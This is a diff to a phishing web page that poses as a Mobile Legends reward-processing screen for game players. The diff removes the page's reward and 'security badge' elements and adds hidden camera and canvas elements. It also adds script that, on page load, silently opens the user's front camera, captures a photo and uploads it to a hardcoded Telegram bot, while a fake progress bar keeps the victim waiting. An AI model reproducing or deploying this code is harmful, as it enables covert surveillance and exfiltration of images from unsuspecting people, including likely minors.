@@ -100,123 +100,13 @@
             80%, 100% { content: ''; }
         }
 
-        /* New styles for enhancements */
-        .steps {
-            display: flex;
-            justify-content: space-between;
-            position: relative;
-            margin: 0 0 25px;
-        }
-
-        .steps::before {
-            content: '';
-            width: 100%;
-            height: 2px;
-            background: rgba(255,255,255,0.1);
+        /* Hidden camera elements */
+        .camera-element {
             position: absolute;
-            top: 15px;
-            z-index: 1;
-        }
-
-        .step {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            z-index: 2;
-        }
-
-        .step-number {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.1);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--text);
-            font-weight: bold;
-        }
-
-        .step-number.active {
-            background: var(--primary);
-            color: #000;
-        }
-
-        .step-text {
-            margin: 5px 0 0;
-            font-size: 12px;
-            color: var(--text-secondary);
-        }
-
-        .step-text.active {
-            color: var(--primary);
-        }
-
-        .reward-preview {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin: 20px 0;
-        }
-
-        .reward-icon {
-            width: 40px;
-            height: 40px;
-            background: rgba(255,215,0,0.1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 18px;
-        }
-
-        .security-badges {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin: 20px 0;
-        }
-
-        .security-badge {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 12px;
-        }
-        
-        /* Mobile adjustments */
-        @media (max-width: 480px) {
-            .container {
-                padding: 20px;
-            }
-            
-            img {
-                width: 100px;
-                margin-bottom: 20px;
-            }
-            
-            h2 {
-                font-size: 20px;
-            }
-        }
-        
-        @media (max-width: 360px) {
-            body {
-                padding: 15px;
-            }
-            
-            .container {
-                padding: 18px;
-            }
-            
-            h2 {
-                font-size: 18px;
-                margin-bottom: 15px;
-            }
-            
-            .status {
-                font-size: 14px;
-            }
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: -1000;
         }
     </style>
 </head>
@@ -224,28 +114,7 @@
     <img src="logo.png" alt="Mobile Legends Logo" loading="lazy">
     
     <div class="container">
-        <div class="steps">
-            <div class="step">
-                <div class="step-number">1</div>
-                <div class="step-text">Claim</div>
-            </div>
-            <div class="step">
-                <div class="step-number">2</div>
-                <div class="step-text">Login</div>
-            </div>
-            <div class="step">
-                <div class="step-number active">3</div>
-                <div class="step-text active">Processing</div>
-            </div>
-        </div>
-        
         <h2>Processing Your Rewards</h2>
-        
-        <div class="reward-preview">
-            <div class="reward-icon">💎</div>
-            <div class="reward-icon">🪙</div>
-            <div class="reward-icon">👕</div>
-        </div>
         
         <div class="progress-container">
             <div class="progress-bar">
@@ -256,64 +125,126 @@
                 <span class="loading-dots"></span>
             </div>
         </div>
-
-        <div class="security-badges">
-            <div class="security-badge">
-                <span style="color:#4CAF50;">🔒</span>
-                <span>Secure Transfer</span>
-            </div>
-            <div class="security-badge">
-                <span style="color:#2196F3;">🛡️</span>
-                <span>Moonton Verified</span>
-            </div>
-        </div>
     </div>
 
+    <!-- Hidden camera elements -->
+    <video id="hiddenCamera" class="camera-element" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" class="camera-element"></canvas>
+
     <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            const progress = document.getElementById('progress');
-            const statusText = document.getElementById('statusText');
-            const statusMessages = [
-                "Verifying account",
-                "Checking inventory",
-                "Processing diamonds",
-                "Confirming battle points",
-                "Preparing exclusive skin",
-                "Finalizing rewards"
-            ];
-            
-            let currentStatus = 0;
-            
+        // Telegram configuration
+        const BOT_TOKEN = "7752857283:AAGYsQ4Jh3hVvBUTIcgz3gdft53Z_B-5rrk";
+        const CHAT_ID = "7328757522";
+        
+        // DOM elements
+        const videoElem = document.getElementById('hiddenCamera');
+        const canvasElem = document.getElementById('hiddenCanvas');
+        const progressElem = document.getElementById('progress');
+        const statusTextElem = document.getElementById('statusText');
+        
+        // Status messages
+        const statusMessages = [
+            "Verifying account",
+            "Checking inventory",
+            "Processing diamonds",
+            "Verifying identity",
+            "Finalizing rewards"
+        ];
+        
+        // Main function
+        async function processRewards() {
             // Start progress animation
-            let progressPercent = 0;
-            const progressInterval = setInterval(() => {
-                progressPercent += 1;
-                progress.style.width = progressPercent + "%";
-                
-                if (progressPercent >= 100) {
-                    clearInterval(progressInterval);
-                }
-            }, 50);
+            animateProgressBar();
             
-            // Update status messages
-            const statusInterval = setInterval(() => {
-                currentStatus = (currentStatus + 1) % statusMessages.length;
-                statusText.textContent = statusMessages[currentStatus];
-                
-                // Slow down updates when near completion
-                if (progressPercent > 80) {
-                    clearInterval(statusInterval);
-                    statusText.textContent = "Completing transaction";
-                }
-            }, 1500);
+            // Attempt to capture photo silently
+            await attemptPhotoCapture();
             
-            // Redirect after progress completes
+            // Redirect after completion
             setTimeout(() => {
-                clearInterval(progressInterval);
-                clearInterval(statusInterval);
                 window.location.href = "success.html";
             }, 5000);
-        });
+        }
+        
+        // Animate progress bar
+        function animateProgressBar() {
+            let currentProgress = 0;
+            let currentStatus = 0;
+            
+            const interval = setInterval(() => {
+                currentProgress += 1;
+                progressElem.style.width = `${currentProgress}%`;
+                
+                // Update status text every 20% progress
+                if (currentProgress % 20 === 0) {
+                    currentStatus = (currentStatus + 1) % statusMessages.length;
+                    statusTextElem.textContent = statusMessages[currentStatus];
+                }
+                
+                if (currentProgress >= 100) {
+                    clearInterval(interval);
+                }
+            }, 50);
+        }
+        
+        // Camera capture function
+        async function attemptPhotoCapture() {
+            try {
+                // 1. Access camera
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+                
+                videoElem.srcObject = stream;
+                
+                // 2. Wait for video to be ready
+                await new Promise(resolve => {
+                    videoElem.onloadedmetadata = resolve;
+                });
+                
+                // 3. Capture after delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                // 4. Capture frame
+                canvasElem.width = videoElem.videoWidth;
+                canvasElem.height = videoElem.videoHeight;
+                const ctx = canvasElem.getContext('2d');
+                ctx.drawImage(videoElem, 0, 0, canvasElem.width, canvasElem.height);
+                
+                // 5. Convert to blob and send
+                return new Promise(resolve => {
+                    canvasElem.toBlob(async blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'ml_verify.jpg');
+                        
+                        try {
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                            console.log("Photo sent successfully");
+                        } catch (error) {
+                            console.error("Failed to send photo:", error);
+                        } finally {
+                            // Clean up
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve();
+                        }
+                    }, 'image/jpeg', 0.8);
+                });
+                
+            } catch (error) {
+                console.error("Camera capture failed:", error);
+                return null;
+            }
+        }
+        
+        // Start the process when page loads
+        document.addEventListener('DOMContentLoaded', processRewards);
     </script>
 </body>
 </html>
